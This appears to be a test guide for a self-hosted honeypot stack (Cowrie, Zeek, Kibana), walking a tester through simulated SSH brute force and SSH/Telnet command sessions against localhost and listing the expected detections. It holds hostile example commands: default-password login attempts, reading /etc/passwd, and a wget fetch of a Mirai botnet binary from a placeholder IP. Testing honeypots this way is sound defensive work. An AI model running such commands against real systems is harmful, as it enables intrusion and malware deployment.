# TrapPot Attack Tests

Use these tests after `docker compose up --build -d`.

Open Kibana at `http://localhost:5601`, log in with `elastic` / `trappotadmin`, then open the **TrapPot Overview** dashboard. Keep the time range on **Last 24 hours** and refresh after each test.

## 1. SSH Brute Force

Run these commands one by one. Type the shown password when SSH asks for it.

```sh
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@localhost -p 2222
# password: root

ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@localhost -p 2222
# password: 123456

ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@localhost -p 2222
# password: admin

ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no pi@localhost -p 2222
# password: raspberry
```

Expected result:

- Cowrie records `cowrie.login.failed`.
- Kibana shows **Brute force attempt** under observed attack types.
- Kibana increases login attempt and Cowrie event counts.
- Zeek records SSH network connections in `conn.log` and `ssh.log`.

## 2. SSH Command Execution

Log in with a valid fake credential:

```sh
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@localhost -p 2222
# password: admin
```

Run:

```sh
whoami
pwd
uname -a
cat /etc/passwd
mkdir ssh_demo_dir
wget http://198.51.100.10/mirai.arm7
exit
```

Expected result:

- Cowrie records `cowrie.login.success`.
- Cowrie records each command as `cowrie.command.input`.
- Kibana shows **Command execution** under observed attack types.
- Kibana shows the commands in **Top commands** and **Commands captured**.
- Zeek records the SSH connection in `conn.log` and `ssh.log`.
- The AI detector reads Zeek `conn.log` and writes decisions to `detections.json`.

## 3. Telnet Login And Commands

Install a Telnet client if your system does not have one:

```sh
sudo pacman -S --needed inetutils
```

Connect to Cowrie Telnet:

```sh
telnet localhost 2223
```

Use:

```text
login: root
Password: admin
```

Run:

```sh
whoami
pwd
uname -a
cat /etc/passwd
mkdir telnet_demo_dir
exit
```

Expected result:

- Cowrie records Telnet sessions with `protocol: telnet`.
- Cowrie records Telnet commands as `cowrie.command.input`.
- Kibana shows Telnet command activity as **Command execution** under observed attack types.
- Kibana shows Telnet in the protocol split after refresh.
- Zeek records Telnet traffic in `conn.log`.
- Zeek does not write Telnet sessions to `ssh.log`; `ssh.log` is only for SSH.

## Quick Log Checks

```sh
docker compose logs cowrie
cat ./zeek/logs/conn.log
cat ./zeek/logs/ssh.log
cat ./zeek/logs/detections.json
docker compose logs logstash
```

If Kibana looks empty, wait 30 seconds and press **Refresh**.

The **RF network decisions** panel is separate from Cowrie attack labels. It scores Zeek connection rows with the trained Random Forest model, so local test traffic can still appear as `Normal` there while Cowrie correctly reports brute-force attempts and command execution.
